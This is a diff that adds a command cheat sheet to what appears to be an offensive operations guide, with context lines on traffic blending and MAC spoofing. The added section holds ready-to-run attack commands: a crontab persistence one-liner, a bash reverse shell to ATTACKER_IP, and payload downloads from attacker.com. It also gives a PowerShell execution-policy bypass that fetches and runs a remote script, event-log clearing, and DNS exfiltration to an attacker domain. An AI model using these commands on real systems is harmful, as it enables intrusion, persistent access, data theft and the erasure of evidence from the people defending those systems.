@@ -655,3 +655,72 @@ curl --resolve legitdomain.com:443:1.2.3.4 https://legitdomain.com/api
 - Use common user-agents
 - Limit network bandwidth usage
 - Spoof MAC addresses when possible
+
+## 9. Command Cheat Sheet
+
+### Persistence
+```bash
+# Crontab one-liner
+(crontab -l 2>/dev/null; echo "@reboot /path/to/payload") | crontab -
+```
+
+### File Operations
+```bash
+# Alternative download methods
+python -c "import urllib; urllib.urlretrieve('http://url/to/file', 'outfile')"
+
+# Background file transfer with logging
+nohup rsync -av --log-file=./rsync.log /source /destination &
+
+# SSH file transfer
+scp user@host:/remote/file /local/destination
+```
+
+### Shell Management
+```bash
+# Upgrade to interactive shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Linux reverse shell
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+```
+
+### Network Operations
+```bash
+# Host discovery
+nmap -Pn TARGET_RANGE
+
+# Connection monitoring
+netstat -tulnp
+
+# HTTP requests
+curl -X POST http://target/path -d 'malicious_payload'
+
+# File downloads
+wget http://attacker.com/payload -O /tmp/payload
+curl -o /tmp/payload https://attacker.com/payload
+```
+
+### Windows Specific
+```powershell
+# Bypass execution policy
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
+
+# Clear event logs
+wevtutil cl System
+```
+
+### Operational Security
+```bash
+# DNS exfiltration (encode data in DNS queries)
+dig +short `base64 data`.attacker.com TXT
+
+# Split large files for exfiltration
+split -b 1M largefile chunk_
+```
+
+**Pro Tips:**
+- Always encrypt sensitive data in transit
+- Use `nohup` or `tmux` for long-running operations
+- Chain commands with `&&` for sequential execution
+- Test all commands in a lab environment first
